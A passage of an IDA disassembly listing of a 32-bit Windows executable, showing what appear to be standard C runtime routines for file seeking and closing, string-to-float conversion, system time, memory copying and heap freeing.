sub_40F5D2      proc near               ; CODE XREF: sub_40F65C+5B↓p

arg_0           = dword ptr  8
lDistanceToMove = dword ptr  0Ch
dwMoveMethod    = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                mov     eax, [esi+0Ch]
                test    al, 83h
                jnz     short loc_40F5F2
                call    sub_41090E
                mov     dword ptr [eax], 16h
                or      eax, 0FFFFFFFFh
                jmp     short loc_40F659
; ---------------------------------------------------------------------------

loc_40F5F2:                             ; CODE XREF: sub_40F5D2+E↑j
                and     eax, 0FFFFFFEFh
                cmp     [ebp+dwMoveMethod], 1
                mov     [esi+0Ch], eax
                jnz     short loc_40F60C
                push    esi
                call    sub_40F3C7
                add     [ebp+lDistanceToMove], eax
                and     [ebp+dwMoveMethod], 0
                pop     ecx

loc_40F60C:                             ; CODE XREF: sub_40F5D2+2A↑j
                push    esi
                call    sub_4150C4
                mov     eax, [esi+0Ch]
                pop     ecx
                test    al, al
                jns     short loc_40F622
                and     eax, 0FFFFFFFCh
                mov     [esi+0Ch], eax
                jmp     short loc_40F638
; ---------------------------------------------------------------------------

loc_40F622:                             ; CODE XREF: sub_40F5D2+46↑j
                test    al, 1
                jz      short loc_40F638
                test    al, 8
                jz      short loc_40F638
                test    eax, 400h
                jnz     short loc_40F638
                mov     dword ptr [esi+18h], 200h

loc_40F638:                             ; CODE XREF: sub_40F5D2+4E↑j
                                        ; sub_40F5D2+52↑j ...
                push    [ebp+dwMoveMethod] ; dwMoveMethod
                push    [ebp+lDistanceToMove] ; lDistanceToMove
                push    esi
                call    sub_40F9B4
                pop     ecx
                push    eax             ; int
                call    sub_415520
                xor     ecx, ecx
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                setnz   cl
                dec     ecx
                mov     eax, ecx

loc_40F659:                             ; CODE XREF: sub_40F5D2+1E↑j
                pop     esi
                pop     ebp
                retn
sub_40F5D2      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F65C      proc near               ; CODE XREF: .text:00403352↑p
                                        ; .text:004033A0↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    0Ch
                push    offset stru_422CC8
                call    __SEH_prolog4
                xor     eax, eax
                xor     esi, esi
                cmp     [ebp+arg_0], esi
                setnz   al
                cmp     eax, esi
                jnz     short loc_40F693

loc_40F676:                             ; CODE XREF: sub_40F65C+46↓j
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     short loc_40F6D1
; ---------------------------------------------------------------------------

loc_40F693:                             ; CODE XREF: sub_40F65C+18↑j
                mov     edi, [ebp+arg_8]
                cmp     edi, esi
                jz      short loc_40F6A4
                cmp     edi, 1
                jz      short loc_40F6A4
                cmp     edi, 2
                jnz     short loc_40F676

loc_40F6A4:                             ; CODE XREF: sub_40F65C+3C↑j
                                        ; sub_40F65C+41↑j
                push    [ebp+arg_0]
                call    sub_413671
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], esi
                push    edi
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_40F5D2
                add     esp, 0Ch
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40F6D7
; ---------------------------------------------------------------------------

loc_40F6CE:                             ; CODE XREF: sub_40F65C+84↓j
                mov     eax, [ebp+var_1C]

loc_40F6D1:                             ; CODE XREF: sub_40F65C+35↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40F6D7:                             ; CODE XREF: sub_40F65C+6D↑j
                                        ; DATA XREF: .rdata:stru_422CC8↓o
                push    [ebp+arg_0]
                call    sub_4136E4
                pop     ecx
                retn
sub_40F65C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F6E1      proc near               ; CODE XREF: sub_40F78C+A↓p

var_28          = byte ptr -28h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 28h
                push    ebx
                push    esi
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     esi, [ebp+arg_0]
                xor     ebx, ebx
                cmp     esi, ebx
                jnz     short loc_40F727
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], bl
                jz      short loc_40F723
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_40F723:                             ; CODE XREF: sub_40F6E1+39↑j
                fldz
                jmp     short loc_40F788
; ---------------------------------------------------------------------------

loc_40F727:                             ; CODE XREF: sub_40F6E1+1C↑j
                                        ; sub_40F6E1+7B↓j
                mov     eax, [ebp+var_10]
                cmp     dword ptr [eax+0ACh], 1
                jle     short loc_40F747
                lea     eax, [ebp+var_10]
                push    eax
                movzx   eax, byte ptr [esi]
                push    8
                push    eax
                call    sub_413CA3
                add     esp, 0Ch
                jmp     short loc_40F757
; ---------------------------------------------------------------------------

loc_40F747:                             ; CODE XREF: sub_40F6E1+50↑j
                movzx   ecx, byte ptr [esi]
                mov     eax, [eax+0C8h]
                movzx   eax, word ptr [eax+ecx*2]
                and     eax, 8

loc_40F757:                             ; CODE XREF: sub_40F6E1+64↑j
                cmp     eax, ebx
                jz      short loc_40F75E
                inc     esi
                jmp     short loc_40F727
; ---------------------------------------------------------------------------

loc_40F75E:                             ; CODE XREF: sub_40F6E1+78↑j
                lea     eax, [ebp+var_10]
                push    eax
                push    ebx
                push    ebx
                push    esi
                call    sub_4102A0
                pop     ecx
                push    eax
                lea     eax, [ebp+var_28]
                push    esi
                push    eax
                call    sub_4155FC
                fld     qword ptr [eax+10h]
                add     esp, 18h
                cmp     [ebp+var_4], bl
                jz      short loc_40F788
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_40F788:                             ; CODE XREF: sub_40F6E1+44↑j
                                        ; sub_40F6E1+9E↑j
                pop     esi
                pop     ebx
                leave
                retn
sub_40F6E1      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F78C      proc near               ; CODE XREF: sub_4065E0+3D↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_0]
                call    sub_40F6E1
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_40F78C      endp


; =============== S U B R O U T I N E =======================================


sub_40F79F      proc near               ; CODE XREF: sub_40F7AF+8↓p
                mov     edi, edi
                push    ecx
                mov     dword ptr [ecx], offset off_4202D8
                call    sub_415E1F
                pop     ecx
                retn
sub_40F79F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F7AF      proc near               ; DATA XREF: .rdata:off_4202D8↓o

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                call    sub_40F79F
                test    [ebp+arg_0], 1
                jz      short loc_40F7C9
                push    esi
                call    sub_40F15B
                pop     ecx

loc_40F7C9:                             ; CODE XREF: sub_40F7AF+11↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_40F7AF      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F7D0      proc near               ; CODE XREF: sub_4183F9+12B↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                add     ecx, 9
                push    ecx
                add     eax, 9
                push    eax
                call    sub_415E90
                neg     eax
                pop     ecx
                sbb     eax, eax
                pop     ecx
                inc     eax
                pop     ebp
                retn    4
sub_40F7D0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F7F0      proc near               ; CODE XREF: sub_40F867+5A↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                xor     edi, edi
                or      ebx, 0FFFFFFFFh
                cmp     esi, edi
                jnz     short loc_40F820
                call    sub_41090E
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                or      eax, ebx
                jmp     short loc_40F862
; ---------------------------------------------------------------------------

loc_40F820:                             ; CODE XREF: sub_40F7F0+12↑j
                test    byte ptr [esi+0Ch], 83h
                jz      short loc_40F85D
                push    esi
                call    sub_4150C4
                push    esi
                mov     ebx, eax
                call    sub_416081
                push    esi
                call    sub_40F9B4
                push    eax
                call    sub_415FB4
                add     esp, 10h
                test    eax, eax
                jge     short loc_40F84C
                or      ebx, 0FFFFFFFFh
                jmp     short loc_40F85D
; ---------------------------------------------------------------------------

loc_40F84C:                             ; CODE XREF: sub_40F7F0+55↑j
                mov     eax, [esi+1Ch]
                cmp     eax, edi
                jz      short loc_40F85D
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx
                mov     [esi+1Ch], edi

loc_40F85D:                             ; CODE XREF: sub_40F7F0+34↑j
                                        ; sub_40F7F0+5A↑j ...
                mov     [esi+0Ch], edi
                mov     eax, ebx

loc_40F862:                             ; CODE XREF: sub_40F7F0+2E↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_40F7F0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F867      proc near               ; CODE XREF: .text:00403360↑p
                                        ; .text:00403485↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    0Ch
                push    offset stru_422CE8
                call    __SEH_prolog4
                or      [ebp+var_1C], 0FFFFFFFFh
                xor     eax, eax
                mov     esi, [ebp+arg_0]
                xor     edi, edi
                cmp     esi, edi
                setnz   al
                cmp     eax, edi
                jnz     short loc_40F8A4
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     short loc_40F8B0
; ---------------------------------------------------------------------------

loc_40F8A4:                             ; CODE XREF: sub_40F867+1E↑j
                test    byte ptr [esi+0Ch], 40h
                jz      short loc_40F8B6
                mov     [esi+0Ch], edi

loc_40F8AD:                             ; CODE XREF: sub_40F867:loc_40F8D6↓j
                mov     eax, [ebp+var_1C]

loc_40F8B0:                             ; CODE XREF: sub_40F867+3B↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40F8B6:                             ; CODE XREF: sub_40F867+41↑j
                push    esi
                call    sub_413671
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                push    esi
                call    sub_40F7F0
                pop     ecx
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40F8DB
; ---------------------------------------------------------------------------

loc_40F8D6:                             ; CODE XREF: sub_40F867+7B↓j
                jmp     short loc_40F8AD
; ---------------------------------------------------------------------------

loc_40F8D8:                             ; DATA XREF: .rdata:stru_422CE8↓o
                mov     esi, [ebp+arg_0]

loc_40F8DB:                             ; CODE XREF: sub_40F867+6A↑j
                push    esi
                call    sub_4136E4
                pop     ecx
                retn
sub_40F867      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F8E3      proc near               ; CODE XREF: sub_401AE0+1F↑p
                                        ; sub_401E10+D9↑p

SystemTimeAsFileTime= _FILETIME ptr -8
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                lea     eax, [ebp+SystemTimeAsFileTime]
                push    eax             ; lpSystemTimeAsFileTime
                call    ds:GetSystemTimeAsFileTime
                mov     eax, [ebp+SystemTimeAsFileTime.dwLowDateTime]
                mov     ecx, [ebp+SystemTimeAsFileTime.dwHighDateTime]
                push    0
                add     eax, 2AC18000h
                push    989680h
                adc     ecx, 0FE624E21h
                push    ecx
                push    eax
                call    sub_4160C0
                cmp     edx, 7
                jl      short loc_40F926
                jg      short loc_40F921
                cmp     eax, 93406FFFh
                jbe     short loc_40F926

loc_40F921:                             ; CODE XREF: sub_40F8E3+35↑j
                or      eax, 0FFFFFFFFh
                mov     edx, eax

loc_40F926:                             ; CODE XREF: sub_40F8E3+33↑j
                                        ; sub_40F8E3+3C↑j
                mov     ecx, [ebp+arg_0]
                test    ecx, ecx
                jz      short locret_40F932
                mov     [ecx], eax
                mov     [ecx+4], edx

locret_40F932:                          ; CODE XREF: sub_40F8E3+48↑j
                leave
                retn
sub_40F8E3      endp


; =============== S U B R O U T I N E =======================================


sub_40F934      proc near               ; CODE XREF: sub_40F94F+3D↓p
                mov     edi, edi
                push    esi
                push    1
                push    offset off_42502C
                mov     esi, ecx
                call    sub_40E69C
                mov     dword ptr [esi], offset off_420260
                mov     eax, esi
                pop     esi
                retn
sub_40F934      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F94F      proc near               ; CODE XREF: sub_403F70+2A↑p
                                        ; sub_408630+22↑p ...

var_C           = byte ptr -0Ch
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0Ch
                jmp     short loc_40F966
; ---------------------------------------------------------------------------

loc_40F959:                             ; CODE XREF: sub_40F94F+22↓j
                push    [ebp+arg_0]
                call    sub_416137
                pop     ecx
                test    eax, eax
                jz      short loc_40F975

loc_40F966:                             ; CODE XREF: sub_40F94F+8↑j
                push    [ebp+arg_0]
                call    sub_40FE32
                pop     ecx
                test    eax, eax
                jz      short loc_40F959
                leave
                retn
; ---------------------------------------------------------------------------

loc_40F975:                             ; CODE XREF: sub_40F94F+15↑j
                test    byte ptr dword_42AAD0, 1
                mov     esi, offset dword_42AAC4
                jnz     short loc_40F99C
                or      dword_42AAD0, 1
                mov     ecx, esi
                call    sub_40F934
                push    offset loc_41F32C
                call    sub_40E955
                pop     ecx

loc_40F99C:                             ; CODE XREF: sub_40F94F+32↑j
                push    esi
                lea     ecx, [ebp+var_C]
                call    sub_40B030
                push    offset unk_42337C
                lea     eax, [ebp+var_C]
                push    eax
                call    sub_41032B
                int     3               ; Trap to Debugger
sub_40F94F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F9B4      proc near               ; CODE XREF: sub_40C190+3E↑p
                                        ; sub_40EE6A+137↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    esi
                xor     esi, esi
                cmp     eax, esi
                jnz     short loc_40F9E0
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     short loc_40F9E3
; ---------------------------------------------------------------------------

loc_40F9E0:                             ; CODE XREF: sub_40F9B4+D↑j
                mov     eax, [eax+10h]

loc_40F9E3:                             ; CODE XREF: sub_40F9B4+2A↑j
                pop     esi
                pop     ebp
                retn
sub_40F9B4      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F9F0      proc near               ; CODE XREF: sub_40CA00+CF↑p
                                        ; sub_40CA00+F6↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                push    edi
                push    esi
                mov     esi, [ebp+arg_4]
                mov     ecx, [ebp+arg_8]
                mov     edi, [ebp+arg_0]
                mov     eax, ecx
                mov     edx, ecx
                add     eax, esi
                cmp     edi, esi
                jbe     short loc_40FA10
                cmp     edi, eax
                jb      loc_40FBB4

loc_40FA10:                             ; CODE XREF: sub_40F9F0+16↑j
                cmp     ecx, 100h
                jb      short loc_40FA37
                cmp     dword_42C9EC, 0
                jz      short loc_40FA37
                push    edi
                push    esi
                and     edi, 0Fh
                and     esi, 0Fh
                cmp     edi, esi
                pop     esi
                pop     edi
                jnz     short loc_40FA37
                pop     esi
                pop     edi
                pop     ebp
                jmp     sub_4165C5
; ---------------------------------------------------------------------------

loc_40FA37:                             ; CODE XREF: sub_40F9F0+26↑j
                                        ; sub_40F9F0+2F↑j ...
                test    edi, 3
                jnz     short loc_40FA54
                shr     ecx, 2
                and     edx, 3
                cmp     ecx, 8          ; switch 8 cases
                jb      short loc_40FA74
                rep movsd               ; jumptable 0040FA74 default case
                jmp     ds:off_40FB64[edx*4]
; ---------------------------------------------------------------------------
                align 4

loc_40FA54:                             ; CODE XREF: sub_40F9F0+4D↑j
                mov     eax, edi
                mov     edx, 3
                sub     ecx, 4
                jb      short loc_40FA6C
                and     eax, 3
                add     ecx, eax
                jmp     dword ptr ds:(loc_40FA74+4)[eax*4]
; ---------------------------------------------------------------------------

loc_40FA6C:                             ; CODE XREF: sub_40F9F0+6E↑j
                jmp     dword ptr ds:loc_40FB74[ecx*4]
; ---------------------------------------------------------------------------
                align 4

loc_40FA74:                             ; CODE XREF: sub_40F9F0+58↑j
                                        ; sub_40F9F0+B6↓j ...
                jmp     ds:off_40FAF8[ecx*4] ; switch jump
; ---------------------------------------------------------------------------
                align 4
                dd offset loc_40FA88
                dd offset loc_40FAB4
                dd offset loc_40FAD8
; ---------------------------------------------------------------------------

loc_40FA88:                             ; DATA XREF: sub_40F9F0+8C↑o
                and     edx, ecx
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     al, [esi+2]
                shr     ecx, 2
                mov     [edi+2], al
                add     esi, 3
                add     edi, 3
                cmp     ecx, 8
                jb      short loc_40FA74
                rep movsd
                jmp     ds:off_40FB64[edx*4]
; ---------------------------------------------------------------------------
                align 4

loc_40FAB4:                             ; DATA XREF: sub_40F9F0+90↑o
                and     edx, ecx
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                shr     ecx, 2
                mov     [edi+1], al
                add     esi, 2
                add     edi, 2
                cmp     ecx, 8
                jb      short loc_40FA74
                rep movsd
                jmp     ds:off_40FB64[edx*4]
; ---------------------------------------------------------------------------
                align 4

loc_40FAD8:                             ; DATA XREF: sub_40F9F0+94↑o
                and     edx, ecx
                mov     al, [esi]
                mov     [edi], al
                add     esi, 1
                shr     ecx, 2
                add     edi, 1
                cmp     ecx, 8
                jb      short loc_40FA74
                rep movsd
                jmp     ds:off_40FB64[edx*4]
; ---------------------------------------------------------------------------
                align 4
off_40FAF8      dd offset loc_40FB5B    ; DATA XREF: sub_40F9F0:loc_40FA74↑r
                dd offset loc_40FB48    ; jump table for switch statement
                dd offset loc_40FB40
                dd offset loc_40FB38
                dd offset loc_40FB30
                dd offset loc_40FB28
                dd offset loc_40FB20
                dd offset loc_40FB18
; ---------------------------------------------------------------------------

loc_40FB18:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                mov     eax, [esi+ecx*4-1Ch] ; jumptable 0040FA74 case 7
                mov     [edi+ecx*4-1Ch], eax

loc_40FB20:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                mov     eax, [esi+ecx*4-18h] ; jumptable 0040FA74 case 6
                mov     [edi+ecx*4-18h], eax

loc_40FB28:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                mov     eax, [esi+ecx*4-14h] ; jumptable 0040FA74 case 5
                mov     [edi+ecx*4-14h], eax

loc_40FB30:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                mov     eax, [esi+ecx*4-10h] ; jumptable 0040FA74 case 4
                mov     [edi+ecx*4-10h], eax

loc_40FB38:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                mov     eax, [esi+ecx*4-0Ch] ; jumptable 0040FA74 case 3
                mov     [edi+ecx*4-0Ch], eax

loc_40FB40:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                mov     eax, [esi+ecx*4-8] ; jumptable 0040FA74 case 2
                mov     [edi+ecx*4-8], eax

loc_40FB48:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                mov     eax, [esi+ecx*4-4] ; jumptable 0040FA74 case 1
                mov     [edi+ecx*4-4], eax
                lea     eax, ds:0[ecx*4]
                add     esi, eax
                add     edi, eax

loc_40FB5B:                             ; CODE XREF: sub_40F9F0:loc_40FA74↑j
                                        ; DATA XREF: sub_40F9F0:off_40FAF8↑o
                jmp     ds:off_40FB64[edx*4] ; jumptable 0040FA74 case 0
; ---------------------------------------------------------------------------
                align 4
off_40FB64      dd offset loc_40FB74    ; DATA XREF: sub_40F9F0+5C↑r
                                        ; sub_40F9F0+BA↑r ...
                dd offset loc_40FB7C
                dd offset loc_40FB88
                dd offset loc_40FB9C
; ---------------------------------------------------------------------------

loc_40FB74:                             ; CODE XREF: sub_40F9F0+5C↑j
                                        ; sub_40F9F0+BA↑j ...
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_40FB7C:                             ; CODE XREF: sub_40F9F0+5C↑j
                                        ; sub_40F9F0+BA↑j ...
                mov     al, [esi]
                mov     [edi], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_40FB88:                             ; CODE XREF: sub_40F9F0+5C↑j
                                        ; sub_40F9F0+BA↑j ...
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_40FB9C:                             ; CODE XREF: sub_40F9F0+5C↑j
                                        ; sub_40F9F0+BA↑j ...
                mov     al, [esi]
                mov     [edi], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_40FBB4:                             ; CODE XREF: sub_40F9F0+1A↑j
                lea     esi, [ecx+esi-4]
                lea     edi, [ecx+edi-4]
                test    edi, 3
                jnz     short loc_40FBE8
                shr     ecx, 2
                and     edx, 3
                cmp     ecx, 8
                jb      short loc_40FBDC
                std
                rep movsd
                cld
                jmp     ds:off_40FD00[edx*4] ; jumptable 0040FC00 case 0
; ---------------------------------------------------------------------------
                align 4

loc_40FBDC:                             ; CODE XREF: sub_40F9F0+1DD↑j
                                        ; sub_40F9F0+238↓j ...
                neg     ecx
                jmp     ds:off_40FCB0[ecx*4]
; ---------------------------------------------------------------------------
                align 4

loc_40FBE8:                             ; CODE XREF: sub_40F9F0+1D2↑j
                mov     eax, edi
                mov     edx, 3
                cmp     ecx, 4          ; switch 4 cases
                jb      short loc_40FC00
                and     eax, 3          ; jumptable 0040FC00 default case
                sub     ecx, eax
                jmp     dword ptr ds:(loc_40FC00+4)[eax*4]
; ---------------------------------------------------------------------------

loc_40FC00:                             ; CODE XREF: sub_40F9F0+202↑j
                                        ; DATA XREF: sub_40F9F0+209↑r
                jmp     ds:off_40FD00[ecx*4] ; switch jump
; ---------------------------------------------------------------------------
                align 4
                dd offset loc_40FC14
                dd offset loc_40FC38
                dd offset loc_40FC60
; ---------------------------------------------------------------------------

loc_40FC14:                             ; DATA XREF: sub_40F9F0+218↑o
                mov     al, [esi+3]
                and     edx, ecx
                mov     [edi+3], al
                sub     esi, 1
                shr     ecx, 2
                sub     edi, 1
                cmp     ecx, 8
                jb      short loc_40FBDC
                std
                rep movsd
                cld
                jmp     ds:off_40FD00[edx*4] ; jumptable 0040FC00 case 0
; ---------------------------------------------------------------------------
                align 4

loc_40FC38:                             ; DATA XREF: sub_40F9F0+21C↑o
                mov     al, [esi+3]
                and     edx, ecx
                mov     [edi+3], al
                mov     al, [esi+2]
                shr     ecx, 2
                mov     [edi+2], al
                sub     esi, 2
                sub     edi, 2
                cmp     ecx, 8
                jb      short loc_40FBDC
                std
                rep movsd
                cld
                jmp     ds:off_40FD00[edx*4] ; jumptable 0040FC00 case 0
; ---------------------------------------------------------------------------
                align 10h

loc_40FC60:                             ; DATA XREF: sub_40F9F0+220↑o
                mov     al, [esi+3]
                and     edx, ecx
                mov     [edi+3], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     al, [esi+1]
                shr     ecx, 2
                mov     [edi+1], al
                sub     esi, 3
                sub     edi, 3
                cmp     ecx, 8
                jb      loc_40FBDC
                std
                rep movsd
                cld
                jmp     ds:off_40FD00[edx*4] ; jumptable 0040FC00 case 0
; ---------------------------------------------------------------------------
                align 4
                dd offset loc_40FCB4
                dd offset loc_40FCBC
                dd offset loc_40FCC4
                dd offset loc_40FCCC
                dd offset loc_40FCD4
                dd offset loc_40FCDC
                dd offset loc_40FCE4
off_40FCB0      dd offset loc_40FCF7    ; DATA XREF: sub_40F9F0+1EE↑r
; ---------------------------------------------------------------------------

loc_40FCB4:                             ; DATA XREF: sub_40F9F0+2A4↑o
                mov     eax, [esi+ecx*4+1Ch]
                mov     [edi+ecx*4+1Ch], eax

loc_40FCBC:                             ; DATA XREF: sub_40F9F0+2A8↑o
                mov     eax, [esi+ecx*4+18h]
                mov     [edi+ecx*4+18h], eax

loc_40FCC4:                             ; DATA XREF: sub_40F9F0+2AC↑o
                mov     eax, [esi+ecx*4+14h]
                mov     [edi+ecx*4+14h], eax

loc_40FCCC:                             ; DATA XREF: sub_40F9F0+2B0↑o
                mov     eax, [esi+ecx*4+10h]
                mov     [edi+ecx*4+10h], eax

loc_40FCD4:                             ; DATA XREF: sub_40F9F0+2B4↑o
                mov     eax, [esi+ecx*4+0Ch]
                mov     [edi+ecx*4+0Ch], eax

loc_40FCDC:                             ; DATA XREF: sub_40F9F0+2B8↑o
                mov     eax, [esi+ecx*4+8]
                mov     [edi+ecx*4+8], eax

loc_40FCE4:                             ; DATA XREF: sub_40F9F0+2BC↑o
                mov     eax, [esi+ecx*4+4]
                mov     [edi+ecx*4+4], eax
                lea     eax, ds:0[ecx*4]
                add     esi, eax
                add     edi, eax

loc_40FCF7:                             ; CODE XREF: sub_40F9F0+1EE↑j
                                        ; DATA XREF: sub_40F9F0:off_40FCB0↑o
                jmp     ds:off_40FD00[edx*4] ; jumptable 0040FC00 case 0
; ---------------------------------------------------------------------------
                align 10h
off_40FD00      dd offset loc_40FD10    ; DATA XREF: sub_40F9F0+1E3↑r
                                        ; sub_40F9F0:loc_40FC00↑r ...
                                        ; jump table for switch statement
                dd offset loc_40FD18    ; jumptable 0040FC00 case 1
                dd offset loc_40FD28    ; jumptable 0040FC00 case 2
                dd offset loc_40FD3C    ; jumptable 0040FC00 case 3
; ---------------------------------------------------------------------------

loc_40FD10:                             ; CODE XREF: sub_40F9F0+1E3↑j
                                        ; sub_40F9F0:loc_40FC00↑j ...
                mov     eax, [ebp+arg_0] ; jumptable 0040FC00 case 0
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_40FD18:                             ; CODE XREF: sub_40F9F0+1E3↑j
                                        ; sub_40F9F0:loc_40FC00↑j ...
                mov     al, [esi+3]     ; jumptable 0040FC00 case 1
                mov     [edi+3], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_40FD28:                             ; CODE XREF: sub_40F9F0+1E3↑j
                                        ; sub_40F9F0:loc_40FC00↑j ...
                mov     al, [esi+3]     ; jumptable 0040FC00 case 2
                mov     [edi+3], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
; ---------------------------------------------------------------------------
                align 4

loc_40FD3C:                             ; CODE XREF: sub_40F9F0+1E3↑j
                                        ; sub_40F9F0:loc_40FC00↑j ...
                mov     al, [esi+3]     ; jumptable 0040FC00 case 3
                mov     [edi+3], al
                mov     al, [esi+2]
                mov     [edi+2], al
                mov     al, [esi+1]
                mov     [edi+1], al
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     edi
                leave
                retn
sub_40F9F0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40FD55(LPVOID lpMem)
sub_40FD55      proc near               ; CODE XREF: sub_405210+61↑p
                                        ; sub_4052B0+112↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
lpMem           = dword ptr  8

                push    0Ch
                push    offset stru_422D08
                call    __SEH_prolog4
                mov     esi, [ebp+lpMem]
                test    esi, esi
                jz      short loc_40FDDD
                cmp     dword_42C9E8, 3
                jnz     short loc_40FDB4
                push    4
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                push    esi
                call    sub_416946
                pop     ecx
                mov     [ebp+var_1C], eax
                test    eax, eax
                jz      short loc_40FD94
                push    esi
                push    eax
                call    sub_416976
                pop     ecx
                pop     ecx

